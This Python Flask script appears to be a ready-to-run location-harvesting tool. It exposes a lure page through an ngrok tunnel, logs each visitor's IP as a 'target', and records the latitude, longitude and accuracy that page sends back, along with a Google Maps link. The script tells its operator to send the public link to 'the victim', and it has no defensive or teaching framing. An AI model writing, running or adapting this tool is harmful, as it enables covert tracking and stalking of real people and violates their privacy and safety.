from flask import Flask, request, send_file
import json
import os
import datetime
import sys
from pyngrok import ngrok
from colorama import init, Fore, Style

init()

logo_lines = [
    " _                    _______  _______  _______  _______  _______  _______ ",
    "( \         |\     /|(  ____ \(  ___  )(  ___  )(  ___  )(  ___  )(  ____ )",
    "| (         | )   ( || (    \/| (   ) || (   ) || (   ) || (   ) || (    )|",
    "| |         | |   | || |      | (___) || (___) || |   | || |   | || (____)|",
    "| |         | |   | || |      |  ___  ||  ___  || |   | || |   | ||     __)",
    "| |         | |   | || |      | (   ) || (   ) || |   | || |   | || (\ (   ",
    "| (____/\|\_| )   ( || (____/\| )   ( || )   ( || (___) || (___) || ) \ \__",
    "(_______/(_______/ (_______/|/     \||/     \|(_______)(_______)|/   \__/"
]

print("\n")
for line in logo_lines:
    # Split for dual color effect (Green/Blue)
    mid = len(line) // 2
    part1 = line[:mid]
    part2 = line[mid:]
    print(f"{Fore.GREEN}{part1}{Fore.BLUE}{part2}{Style.RESET_ALL}")
print("\n")

# --- CONFIG ---
PORT = 5001 # Using different port just in case

# Prompt user for ngrok authtoken
print(f"{Fore.YELLOW}Enter your ngrok authtoken (get it from https://dashboard.ngrok.com/get-started/your-authtoken):{Style.RESET_ALL}")
authtoken = input("Authtoken: ").strip()

if authtoken:
    ngrok.set_auth_token(authtoken)
else:
    print(f"{Fore.RED}No authtoken provided. Dealing with potential errors...{Style.RESET_ALL}")

# --------------

app = Flask(__name__)

# Ensure locations directory exists
LOC_DIR = 'locations'
if not os.path.exists(LOC_DIR):
    os.makedirs(LOC_DIR)

@app.route('/')
def index():
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"--------------------------------------------------")
    print(f"{Fore.GREEN}[+] Target Opened the Link! IP: {ip_addr}{Style.RESET_ALL}")
    print(f"--------------------------------------------------")
    return send_file('location.html')

@app.route('/location', methods=['POST'])
def receive_location():
    try:
        data = request.json
        lat = data.get('latitude')
        long = data.get('longitude')
        acc = data.get('accuracy')
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        log_entry = f"""
--------------------------------------------------
Timestamp: {timestamp}
IP: {ip_addr}
Latitude: {lat}
Longitude: {long}
Accuracy: {acc} meters
Google Maps: https://www.google.com/maps/place/{lat},{long}
--------------------------------------------------
"""
        print(f"{Fore.GREEN}[!] LOCATION RECEIVED!{Style.RESET_ALL}")
        print(log_entry)
        
        # Save to file
        filename = f"{LOC_DIR}/location_log.txt"
        with open(filename, "a") as f:
            f.write(log_entry)
            
        return {"status": "success"}, 200
    except Exception as e:
        print(f"Error processing location: {e}")
        return {"status": "error", "message": str(e)}, 500

if __name__ == '__main__':
    print("----------------------------------------------------------------")
    print(f"Starting Location Server on port {PORT}...")

    # Force kill any previous ngrok sessions to avoid ERR_NGROK_108
    print(f"{Fore.YELLOW}[*] Cleaning up old ngrok sessions...{Style.RESET_ALL}")
    ngrok.kill()
    
    try:
        # Open a ngrok tunnel to the HTTP server
        public_url = ngrok.connect(PORT).public_url
        print(f" * Public URL: {Fore.GREEN}{public_url}{Style.RESET_ALL}")
        print("   (Send this link to the victim)")
        print("----------------------------------------------------------------")
    except Exception as e:
        print(f"{Fore.RED}Error starting ngrok: {e}{Style.RESET_ALL}")
        print("Make sure you have an internet connection.")

    try:
        app.run(port=PORT, debug=False)
    except KeyboardInterrupt:
        print("Shutting down...")
        ngrok.kill()
        sys.exit(0)
